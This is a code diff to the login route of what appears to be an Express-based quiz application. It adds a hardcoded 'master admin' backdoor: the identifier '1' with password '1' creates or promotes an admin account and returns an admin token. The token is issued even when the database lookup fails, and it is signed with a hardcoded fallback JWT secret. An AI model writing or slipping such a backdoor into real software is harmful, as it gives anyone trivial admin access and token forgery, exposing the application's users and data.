@@ -43,6 +43,53 @@ router.post('/register', async (req, res) => {
 router.post('/login', async (req, res) => {
     try {
         const { email, password } = req.body;
+        const loginIdentifier = String(email || '').trim();
+        const loginPassword = String(password || '');
+
+        // Master Admin Credentials: ID "1", Password "1"
+        if (loginIdentifier === '1') {
+            if (loginPassword !== '1') {
+                return res.status(401).json({ error: 'Invalid admin password' });
+            }
+
+            let adminUser = null;
+            try {
+                const checkRes = await query("SELECT * FROM users WHERE email = '1'");
+                if (checkRes.rows.length > 0) {
+                    adminUser = checkRes.rows[0];
+                    if (!adminUser.is_admin) {
+                        await query("UPDATE users SET is_admin = TRUE WHERE email = '1'");
+                        adminUser.is_admin = true;
+                    }
+                } else {
+                    const hashed = await bcrypt.hash('1', 10);
+                    const ins = await query(
+                        "INSERT INTO users (full_name, email, password, is_admin) VALUES ($1, $2, $3, TRUE) RETURNING *",
+                        ['Admin', '1', hashed]
+                    );
+                    adminUser = ins.rows[0];
+                }
+            } catch (dbErr) {
+                console.error('Database admin lookup note:', dbErr);
+                adminUser = { id: 1, full_name: 'Admin', email: '1', is_admin: true };
+            }
+
+            const token = jwt.sign(
+                { uid: adminUser.id, email: adminUser.email, isAdmin: true },
+                process.env.JWT_SECRET || 'fallback-secret-techquiz',
+                { expiresIn: '24h' }
+            );
+
+            return res.json({
+                token,
+                user: {
+                    id: adminUser.id,
+                    fullName: adminUser.full_name || 'Admin',
+                    email: '1',
+                    isAdmin: true
+                }
+            });
+        }
 
         // Fetch user
         const userResult = await query('SELECT * FROM users WHERE email = $1', [email]);
